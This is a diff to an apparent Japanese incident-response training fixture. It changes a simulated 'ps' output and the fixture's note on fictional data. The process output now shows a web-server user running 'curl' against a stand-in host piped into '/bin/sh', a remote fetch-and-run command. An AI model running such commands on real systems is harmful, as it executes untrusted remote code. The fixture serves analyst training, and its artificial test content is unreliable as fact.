@@ -22,7 +22,7 @@
       "id": "ps",
       "name": "ps",
       "description": "選択PIDのUser・親PID・Command Lineを確認します。",
-      "output": "USER PID PPID ELAPSED COMMAND\nwww-data 4200 3100 00:10 /bin/sh -c \"curl https://worker-assets.example/a.sh | <TRAINING-PLACEHOLDER:取得Scriptの実行>\"",
+      "output": "Commandの抜粋\nUSER PID PPID ELAPSED COMMAND\nwww-data 4200 3100 00:10 /bin/sh -c \"curl https://worker-assets.example/a.sh | /bin/sh 〔引数を省略〕\"",
       "accepted_information_types": [
         "pid"
       ],
@@ -388,5 +388,5 @@
   "sources": [
     "https://www.freedesktop.org/software/systemd/man/latest/systemctl.html"
   ],
-  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。攻撃コマンドのPayloadは<TRAINING-PLACEHOLDER>に置換。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。"
+  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。Command・Sourceの〔…を省略〕は教材の編集箇所。実行可能なPayloadは配布しない。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。"
 }
